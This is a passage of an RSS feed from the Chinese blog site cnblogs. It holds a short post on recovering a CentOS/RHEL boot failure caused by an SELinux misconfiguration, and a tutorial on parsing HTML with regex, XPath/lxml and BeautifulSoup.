<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>RHEL因为selinux设置失误，无法重启问题。（centos适用） - f1烈日灼心</title>
<link>http://www.cnblogs.com/volac/p/10317621.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/volac/p/10317621.html</guid>
<description>&lt;p&gt;今天做FTP模拟的时候selinux设置出现失误。导致系统无法重新启动。出现如下界面&lt;/p&gt;
&lt;p&gt;Failed To Load SELinux policy.freezing &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1491231/201901/1491231-20190124230506102-664534996.png&quot; alt=&quot;&quot;/&gt;..&lt;/p&gt;
&lt;p&gt;网上找了下，解决方法如下：&lt;/p&gt;
&lt;p&gt;开机之后进入linux启动选择界面，停在平时启动的哪那一行按E键，进入grub编辑页面。&lt;/p&gt;
&lt;p&gt;在LANG=zh_CN.UTF-8 空格 加上 selinux=0或者 enforcing=0&lt;/p&gt;
&lt;p&gt;最后ctrl+x。&lt;/p&gt;
&lt;p&gt;此时熟悉的界面出现了，现在需要将执行错误的selinux参数改过来。SELINUX=enforcing 改为 ELINUX=disabled。reboot。完事！&lt;/p&gt;

</description>
<pubDate>Thu, 24 Jan 2019 15:48:00 +0000</pubDate>
<dc:creator>f1烈日灼心</dc:creator>
<og:description>今天做FTP模拟的时候selinux设置出现失误。导致系统无法重新启动。出现如下界面 Failed To Load SELinux policy.freezing .. 网上找了下，解决方法如下： 开</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/volac/p/10317621.html</dc:identifier>
</item>
<item>
<title>爬虫之数据解析的三种方式 - 温而新</title>
<link>http://www.cnblogs.com/peng104/p/10317601.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/peng104/p/10317601.html</guid>
<description>&lt;p&gt;re正则就不写了，前面已经写入一篇很详细的正则表达式模块了~&lt;/p&gt;
&lt;p&gt;而且，在爬虫中，下面两种方式用的多一些~&lt;/p&gt;
&lt;p&gt;正则表达式：&lt;a href=&quot;https://www.cnblogs.com/peng104/p/9619801.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/peng104/p/9619801.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;大致用法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
pattern = re.compile(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;dd&amp;gt;.*?board-index.*?&amp;gt;(\d+)&amp;lt;/i&amp;gt;.*?src=&quot;(.*?)&quot;.*?name&quot;&amp;gt;&amp;lt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
                     +&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.*?&amp;gt;(.*?)&amp;lt;/a&amp;gt;.*?star&quot;&amp;gt;(.*?)&amp;lt;/p&amp;gt;.*?releasetime&quot;&amp;gt;(.*?)&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
                     +&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.*?integer&quot;&amp;gt;(.*?)&amp;lt;/i&amp;gt;.*?fraction&quot;&amp;gt;(.*?)&amp;lt;/i&amp;gt;.*?&amp;lt;/dd&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, re.S)
items &lt;/span&gt;= re.findall(pattern, html)
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;简介及安装&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;简介：&lt;/strong&gt;XPath 是一门在 XML 文档中查找信息的语言。XPath 可用来在 XML 文档中对元素和属性进行遍历。XPath 是 W3C XSLT 标准的主要元素，并且 XQuery 和 XPointer 都构建于 XPath 表达之上。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安装：&lt;/strong&gt;pip install lxml&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;调用方法：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 先导包&lt;/span&gt;
&lt;span&gt;from&lt;/span&gt; lxml &lt;span&gt;import&lt;/span&gt;&lt;span&gt; etree

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 将html文档或者xml文档转换成一个etree对象，然后调用对象中的方法查找指定的节点&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; 1. 本地文件&lt;/span&gt;
tree =&lt;span&gt; etree.parse(文件名)
tree.xpath(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;xpath表达式&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 2. 网络数据&lt;/span&gt;
tree =&lt;span&gt; etree.HTML(网页内容字符串)
tree.xpath(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;xpath表达式&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;语法简介&lt;/h2&gt;
&lt;p&gt;先准备一个HTML格式的字符串&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('0c4a7645-a810-4df1-84e8-51fe2b57922e')&quot; readability=&quot;33&quot;&gt;&lt;img id=&quot;code_img_closed_0c4a7645-a810-4df1-84e8-51fe2b57922e&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_0c4a7645-a810-4df1-84e8-51fe2b57922e&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('0c4a7645-a810-4df1-84e8-51fe2b57922e',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_0c4a7645-a810-4df1-84e8-51fe2b57922e&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;61&quot;&gt;
&lt;pre&gt;
html_doc = &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;
    &amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

&amp;lt;div class=&quot;d1&quot;&amp;gt;
    &amp;lt;div class=&quot;d2&quot;&amp;gt;
            &amp;lt;p class=&quot;story&quot;&amp;gt;
                &amp;lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,
                &amp;lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&amp;gt;Lacie&amp;lt;/a&amp;gt; and
                &amp;lt;a href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;
            &amp;lt;/p&amp;gt;
    &amp;lt;/div&amp;gt;
    &amp;lt;div&amp;gt;
        &amp;lt;p id=&quot;p1&quot;&amp;gt;人生苦短&amp;lt;/p&amp;gt;
        &amp;lt;p id=&quot;p2&quot;&amp;gt;我用python&amp;lt;/p&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;

&amp;lt;div class=&quot;d3&quot;&amp;gt;
    &amp;lt;a href=&quot;http://www.baidu.com&quot;&amp;gt;baidu&amp;lt;/a&amp;gt;
    &amp;lt;p&amp;gt;百度&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;

&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;变量准备&lt;/span&gt;&lt;/div&gt;
&lt;h3&gt;1，选取节点&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
nodename     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取nodename节点的所有子节点         xpath(‘//div’)         # 选取了所有div节点&lt;/span&gt;
/            &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 从根节点选取                        xpath(‘/div’)          # 从根节点上选取div节点&lt;/span&gt;
//           &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取所有的当前节点，不考虑他们的位置    xpath(‘//div’)         # 选取所有的div节点&lt;/span&gt;
.            &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点                        xpath(‘./div’)         # 选取当前节点下的div节点&lt;/span&gt;
..           &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点的父节点                 xpath(‘..’)            # 回到上一个节点&lt;/span&gt;
@            &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取属性                           xpath（’//@calss’）     # 选取所有的class属性&lt;/span&gt;

&lt;span&gt;#&lt;/span&gt;&lt;span&gt;######################⬇例子⬇######################&lt;/span&gt;
&lt;span&gt;
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;//div&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/div&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;./div&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;//p[@id='p1']&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;//div[@class='d1']/div/p[@class='story']&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;2，谓语&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;表达式                                         结果
xpath(‘&lt;/span&gt;/body/div[1]’)                     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取body下的第一个div节点&lt;/span&gt;
xpath(‘/body/div[last()]’)                &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取body下最后一个div节点&lt;/span&gt;
xpath(‘/body/div[last()-1]’)              &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取body下倒数第二个div节点&lt;/span&gt;
xpath(‘/body/div[positon()&amp;lt;3]’)           &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取body下前两个div节点&lt;/span&gt;
xpath(‘/body/div[@&lt;span&gt;class&lt;/span&gt;]’)                &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取body下带有class属性的div节点&lt;/span&gt;
xpath(‘/body/div[@&lt;span&gt;class&lt;/span&gt;=”main”]’)         &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取body下class属性为main的div节点&lt;/span&gt;
xpath(‘/body/div[@price&amp;gt;35.00]’)          &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取body下price元素值大于35的div节点&lt;/span&gt;

&lt;span&gt;#&lt;/span&gt;&lt;span&gt;######################⬇例子⬇######################&lt;/span&gt;
&lt;span&gt;
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;//p[@class='story']//a[2]&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;//p[@class='story']//a[last()]&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;3，通配符&lt;/h3&gt;
&lt;p&gt;Xpath通过通配符来选取未知的XML元素&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;表达式                 结果
xpath（’&lt;/span&gt;/div/*’）     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取div下的所有子节点&lt;/span&gt;
xpath(‘/div[@*]’)    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取所有带属性的div节点&lt;/span&gt;

&lt;span&gt;#&lt;/span&gt;&lt;span&gt;######################⬇例子⬇######################&lt;/span&gt;
&lt;span&gt;
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;//p[@class='story']/*&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;//p[@class='story']/a[@class]&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;4，取多个路径&lt;/h3&gt;
&lt;p&gt;使用 “|” 运算符可以选取多个路径&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;表达式                         结果
xpath(‘&lt;/span&gt;//div|//table’)    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取所有的div和table节点&lt;/span&gt;

&lt;span&gt;#&lt;/span&gt;&lt;span&gt;######################⬇例子⬇######################&lt;/span&gt;
&lt;span&gt;
ret&lt;/span&gt;=selector.xpath(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;//p[@class='story']/a[@class]|//div[@class='d3']&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(ret)
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;5，Xpath轴&lt;/h3&gt;
&lt;p&gt;轴可以定义相对于当前节点的节点集&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;轴名称                      表达式                                  描述
ancestor                xpath(‘.&lt;/span&gt;/ancestor::*’)              &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点的所有先辈节点（父、祖父）&lt;/span&gt;
ancestor-&lt;span&gt;or&lt;/span&gt;-self        xpath(‘./ancestor-&lt;span&gt;or&lt;/span&gt;-self::*’)      &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点的所有先辈节点以及节点本身&lt;/span&gt;
attribute               xpath(‘./attribute::*’)             &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点的所有属性&lt;/span&gt;
child                   xpath(‘./child::*’)                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 返回当前节点的所有子节点&lt;/span&gt;
descendant              xpath(‘./descendant::*’)            &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 返回当前节点的所有后代节点（子节点、孙节点）&lt;/span&gt;
following               xpath(‘./following::*’)             &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取文档中当前节点结束标签后的所有节点&lt;/span&gt;
following-sibing        xpath(‘./following-sibing::*’)      &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点之后的兄弟节点&lt;/span&gt;
parent                  xpath(‘./parent::*’)                &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点的父节点&lt;/span&gt;
preceding               xpath(‘./preceding::*’)             &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取文档中当前节点开始标签前的所有节点&lt;/span&gt;&lt;span&gt;
preceding&lt;/span&gt;-sibling       xpath(‘./preceding-sibling::*’)     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点之前的兄弟节点&lt;/span&gt;
self                    xpath(‘./self::*’)                  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取当前节点&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;6，功能函数&lt;/h3&gt;
&lt;p&gt;使用功能函数能够更好的进行模糊搜索&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;函数                  用法                                                               解释
starts&lt;/span&gt;-with         xpath(‘//div[starts-with(@id,”ma”)]‘)                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取id值以ma开头的div节点&lt;/span&gt;
contains            xpath(‘//div[contains(@id,”ma”)]‘)                           &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取id值包含ma的div节点&lt;/span&gt;
&lt;span&gt;and&lt;/span&gt;                 xpath(‘//div[contains(@id,”ma”) &lt;span&gt;and&lt;/span&gt; contains(@id,”&lt;span&gt;in&lt;/span&gt;”)]‘)    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取id值包含ma和in的div节点&lt;/span&gt;
text()              xpath(‘//div[contains(text(),”ma”)]‘)                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 选取节点文本包含ma的div节点&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Element对象&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; lxml.etree &lt;span&gt;import&lt;/span&gt;&lt;span&gt; _Element
&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; obj &lt;span&gt;in&lt;/span&gt;&lt;span&gt; ret:
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(obj)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(type(obj))  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; from lxml.etree import _Element&lt;/span&gt;

&lt;span&gt;'''&lt;/span&gt;&lt;span&gt;
Element对象

class xml.etree.ElementTree.Element(tag, attrib={}, **extra)

　　tag：string，元素代表的数据种类。
　　text：string，元素的内容。
　　tail：string，元素的尾形。
　　attrib：dictionary，元素的属性字典。
　　
　　＃针对属性的操作
　　clear()：清空元素的后代、属性、text和tail也设置为None。
　　get(key, default=None)：获取key对应的属性值，如该属性不存在则返回default值。
　　items()：根据属性字典返回一个列表，列表元素为(key, value）。
　　keys()：返回包含所有元素属性键的列表。
　　set(key, value)：设置新的属性键与值。

　　＃针对后代的操作
　　append(subelement)：添加直系子元素。
　　extend(subelements)：增加一串元素对象作为子元素。＃python2.7新特性
　　find(match)：寻找第一个匹配子元素，匹配对象可以为tag或path。
　　findall(match)：寻找所有匹配子元素，匹配对象可以为tag或path。
　　findtext(match)：寻找第一个匹配子元素，返回其text值。匹配对象可以为tag或path。
　　insert(index, element)：在指定位置插入子元素。
　　iter(tag=None)：生成遍历当前元素所有后代或者给定tag的后代的迭代器。＃python2.7新特性
　　iterfind(match)：根据tag或path查找所有的后代。
　　itertext()：遍历所有后代并返回text值。
　　remove(subelement)：删除子元素。
&lt;/span&gt;&lt;span&gt;'''&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;简介及安装&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;简介：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;    Beautiful Soup提供一些简单的、python式的函数用来处理导航、搜索、修改分析树等功能。&lt;br/&gt;    它是一个工具箱，通过解析文档为用户提供需要抓取的数据，因为简单，所以不需要多少代码就可以写出一个完整的应用程序。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安装：&lt;/strong&gt;pip3 install beautifulsoup4&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解析器：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;    Beautiful Soup支持Python标准库中的HTML解析器,还支持一些第三方的解析器，如果我们不安装它，则 Python 会使用 Python默认的解析器，lxml 解析器更加强大，速度更快&lt;strong&gt;。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://beautifulsoup.readthedocs.io/zh_CN/latest/&quot; target=&quot;_blank&quot;&gt;官方文档&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;简单使用&lt;/h2&gt;
&lt;p&gt;使用方式：可以将一个html文档，转化为BeautifulSoup对象，然后通过对象的方法或者属性去查找指定的节点内容&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; bs4 &lt;span&gt;import&lt;/span&gt;&lt;span&gt; BeautifulSoup

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 转化本地文件&lt;/span&gt;
soup = BeautifulSoup(open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;本地文件&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;), &lt;span&gt;'&lt;/span&gt;&lt;span&gt;lxml&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 转化网络文件&lt;/span&gt;
soup = BeautifulSoup(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;字符串类型或者字节类型&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;lxml&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 从文档中获取所有文字内容:&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(soup.get_text())
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;语法简介&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 1.根据标签名查找&lt;/span&gt;
    -&lt;span&gt; soup.a   只能找到第一个符合要求的标签
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 2.获取属性&lt;/span&gt;
    -&lt;span&gt; soup.a.attrs  获取a所有的属性和属性值，返回一个字典
    &lt;/span&gt;- soup.a.attrs[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]   获取href属性
    &lt;/span&gt;- soup.a[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]   也可简写为这种形式
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 3.获取内容&lt;/span&gt;
    -&lt;span&gt; soup.a.string
    &lt;/span&gt;-&lt;span&gt; soup.a.text
    &lt;/span&gt;-&lt;span&gt; soup.a.get_text()
   注意:如果标签还有标签，那么string获取到的结果为None，而其它两个，可以获取文本内容
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 4.find：找到第一个符合要求的标签&lt;/span&gt;
    - soup.find(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)  找到第一个符合要求的
    &lt;/span&gt;- soup.find(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, title=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;xxx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;- soup.find(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, alt=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;xxx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;- soup.find(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, class_=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;xxx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;- soup.find(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;xxx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 5.find_all：找到所有符合要求的标签&lt;/span&gt;
    - soup.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;- soup.find_all([&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;b&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]) 找到所有的a和b标签
    &lt;/span&gt;- soup.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, limit=2&lt;span&gt;)  限制前两个
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 6.根据选择器选择指定的内容&lt;/span&gt;
           select:soup.select(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;#feng&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;- 常见的选择器：标签选择器(a)、类选择器(.)、id选择器(&lt;span&gt;#&lt;/span&gt;&lt;span&gt;)、层级选择器&lt;/span&gt;
        -&lt;span&gt; 层级选择器：
            div .dudu &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;lala .meme .xixi  下面好多级&lt;/span&gt;
            div &amp;gt; p &amp;gt; a &amp;gt;&lt;span&gt; .lala          只能是下面一级
    注意:select选择器返回永远是列表，需要通过下标提取指定的对象&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;find_all()&lt;/h2&gt;
&lt;p&gt;先准备一个HTML格式的字符串&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('83c667d6-f18a-428e-a0b0-7b4e031fdb5c')&quot; readability=&quot;33&quot;&gt;&lt;img id=&quot;code_img_closed_83c667d6-f18a-428e-a0b0-7b4e031fdb5c&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_83c667d6-f18a-428e-a0b0-7b4e031fdb5c&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('83c667d6-f18a-428e-a0b0-7b4e031fdb5c',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_83c667d6-f18a-428e-a0b0-7b4e031fdb5c&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;61&quot;&gt;
&lt;pre&gt;
html_doc = &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;The Dormouse's story&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;p id=&quot;my p&quot; class=&quot;title&quot;&amp;gt;&amp;lt;b id=&quot;bbb&quot; class=&quot;boldest&quot;&amp;gt;The Dormouse's story&amp;lt;/b&amp;gt;
&amp;lt;/p&amp;gt;

&amp;lt;p class=&quot;story&quot;&amp;gt;Once upon a time there were three little sisters; and their names were
&amp;lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,
